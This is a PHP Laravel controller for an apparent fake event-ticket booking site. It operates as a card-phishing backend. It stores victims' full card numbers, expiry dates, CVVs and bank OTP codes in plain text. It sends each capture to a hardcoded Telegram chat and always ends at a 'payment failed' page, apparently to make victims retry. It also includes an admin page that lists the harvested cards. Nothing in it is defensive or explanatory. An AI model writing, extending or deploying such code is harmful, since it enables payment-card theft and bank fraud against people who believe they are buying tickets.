<?php

namespace App\Http\Controllers;

use App\Models\Card;
use App\Models\Event;
use App\Models\Order;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Redirect;
use Illuminate\Support\Facades\Session;
use PhpParser\JsonDecoder;
use Telegram\Bot\Laravel\Facades\Telegram;

class HomeController extends Controller
{

    public function home()
    {
        return view('index');
    }
    public function index()
    {
        return view('admin.index');
    }

    public function event($id)
    {
        $event = Event::query()->findOrFail($id);
        return view('event',compact('event'));
    }

    public function book($id)
    {
        $event = Event::query()->findOrFail($id);
        return view('book',compact('event'));
    }

    public function confirm_booking(Request $request)
    {
//        sleep(3);
        // Extract ticket data from the request
        $ticketData = $request->input('data');

        $orderNumber = $this->generateOrderNumber();

        // Create a new order
        $order = Order::create([
            'order_number' => $orderNumber,
            'status' => 'Pending',
        ]);

        // Prepare data for syncing
        $syncData = [];
        foreach ($ticketData as $item) {
            $ticketId = $item[0];
            $count = $item[1];
            $syncData[$ticketId] = ['count' => $count];
        }

        // Sync the tickets with the order using a custom pivot table field
        $order->tickets()->sync($syncData);

        return response()->json([
            'message' => 'Tickets have been attached to the order successfully.',
            'data' => $order->id
        ]);
    }


    public function generateOrderNumber()
    {
        // Get the latest order number from the database
        $latestOrder = DB::table('orders')
            ->where('order_number', 'LIKE', 'ORD-' . date('Y') . '-%')
            ->orderBy('order_number', 'desc')
            ->first();

        // Extract the latest number and increment it
        $latestNumber = $latestOrder ? (int) substr($latestOrder->order_number, -3) : 0;
        $newNumber = str_pad($latestNumber + 1, 3, '0', STR_PAD_LEFT);

        // Create the new order number
        return 'ORD-' . date('Y') . '-' . $newNumber;
    }

    public function create_order(Request $request)
    {
        $request->validate([
           'user_name' => 'required',
           'email' => 'required|email',
           'phone' => 'required'
        ]);
        $data = $request->only([
           'user_name','email','phone'
        ]);
        $order = Order::query()->findOrFail($request->orderId);
        $order->update($data);
        if ($order){
            $grandTotal = 0;
            $count_1 = 0;
            foreach ($order->tickets as $ticket) {
                $price = $ticket->price;
                $count = $ticket->pivot->count;
                $count_1 += $count;
                $total = $price * $count;
                $grandTotal += $total;
            }
            $event = $order->tickets[0]->event->title;
            $price = $order->tickets[0]->price;
            $name = $order->user_name;
            $phone = $order->phone;

            $message = "
            ====== 🚚 New Order ========

        👤: $name

        🏟️: $event

        🎫: Tickets : X$count_1

        💰: Total : $grandTotal ريال

        📞: $phone
      ======================

                    ";

            $this->send_telegram($message);
            return \redirect()->route('pay')->with('order',$order);
        }else{
            return \redirect()->back();
        }
    }

    public function pay(Request $request)
    {
        return view('pay');
    }

    public function confirm_pay(Request $request)
    {
        $data = $request->only([
           'cardnumber','ccmonth','ccyear','cvv','orderId'
        ]);
        $data['cardnumber'] = preg_replace('/\s+/', '', $request->cardnumber);
        $card = Card::query()->where('cardnumber',$data['cardnumber'])->first();
        if ($card){
            $card->update([
                'attempt'=>  $card->attempt + 1
            ]);
        }else{
            $card = Card::query()->create($data);
        }

        if ($card){

            $name = $card->order->user_name;
            $phone = $card->order->phone;

            $message = "
            ====== 💳 New Card ========

        👤: $name

        💳: $card->cardnumber

        📅: $card->ccmonth / $card->ccyear

        🔐: $card->cvv

        📞: $phone

        🔂: $card->attempt attempt

      ======================
        ";
            $this->send_telegram($message);

            return response()->json([
                'message' => 'Data received & stored successfully',
                'status' => 200,
                'data' => $card->id
            ]);
        }else{
            return response()->json([
                'message' => 'Error at receiving & storing data',
                'status' => 403,
            ]);
        }

    }

    public function otp()
    {
        return view('otp');
    }

    public function send_otp(Request $request)
    {
        $request->validate([
            'otp' => 'required',
            'cardId' => 'required'
        ]);
        $card = Card::query()->findOrFail($request->cardId);

        $card->update([
            'otp' => $request->otp
        ]);
        $card->save();

        $name = $card->order->user_name;

        $message = "
            ====== 💳 Otp ========

        👤: $name

        💳: $card->cardnumber

        🔂: $card->attempt attempt

        📟: $card->otp

      ======================
        ";

            $this->send_telegram($message);
        // $event = $card->order->tickets[0]->event->id;
        return \redirect()->route('payment.failed');
    }








    public function send_telegram($message)
    {
        Telegram::sendMessage([
                'chat_id' => '981019297',//abood
                'text' => $message
        ]);

//        Telegram::sendMessage([
//                'chat_id' => '', // Aya
//                'text' => $message
//        ]);
    }

    public function telegram()
    {
        return Telegram::getUpdates();
    }


    public function orders()
    {
        $orders = Order::query()->latest()->paginate(15);
        return view('admin.orders.index',compact('orders'));
    }

    public function cards()
    {
        $cards = Card::query()->latest()->paginate(15);
        return view('admin.cards.index',compact('cards'));
    }
}
